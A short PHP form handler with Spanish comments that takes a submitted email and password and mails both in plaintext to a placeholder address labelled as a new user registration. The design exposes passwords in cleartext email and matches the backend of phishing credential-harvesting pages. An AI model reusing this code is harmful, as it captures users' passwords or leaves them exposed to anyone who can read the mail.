<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "tu-correo@ejemplo.com"; // Cambia esto por tu correo electrónico
    $subject = "Nuevo Registro de Usuario";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: no-reply@tu-dominio.com"; // Cambia esto por tu dominio

    if (mail($to, $subject, $message, $headers)) {
        echo "success";
    } else {
        echo "error";
    }
} else {
    echo "error";
}
?>
